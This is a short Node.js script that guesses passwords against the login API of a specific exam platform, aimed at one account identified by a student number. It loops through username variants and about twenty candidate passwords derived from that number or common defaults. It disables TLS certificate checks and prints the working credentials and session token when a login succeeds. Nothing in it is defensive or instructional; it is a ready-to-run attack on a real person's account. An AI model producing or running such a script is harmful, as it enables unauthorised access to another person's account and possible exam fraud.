import "dotenv/config";

const CONFIG = {
  baseUrl: "https://corporate.bharatenglish.org",
};

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const passwords = [
  "1252613",
  "1252613@lpu.in",
  "1252613@lpu",
  "1252613#",
  "1252613@",
  "12526131",
  "12526130",
  "12526132",
  "12526133",
  "12526134",
  "12526135",
  "12526136",
  "12526137",
  "12526138",
  "12526139",
  "Lpu1252613",
  "lpu1252613",
  "1252613@Lpu",
  "Password@123",
  "password"
];

const usernames = [
  "1252613@lpu.in",
  "1252613"
];

async function tryCombos() {
  for (const u of usernames) {
    for (const p of passwords) {
      try {
        const res = await fetch(`${CONFIG.baseUrl}/api/public/bet-exams/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: u, password: p, appContext: "BET_CORPORATE" })
        });
        if (res.ok) {
          const data = await res.json();
          console.log(`\nSUCCESS SUCCESS SUCCESS!`);
          console.log(`Username: "${u}" | Password: "${p}"`);
          console.log(`Token received: ${JSON.stringify(data).slice(0, 100)}`);
          return;
        }
      } catch (e) {}
    }
  }
  console.log("\nNo matching password combo found for 1252613.");
}

tryCombos().catch(console.error);
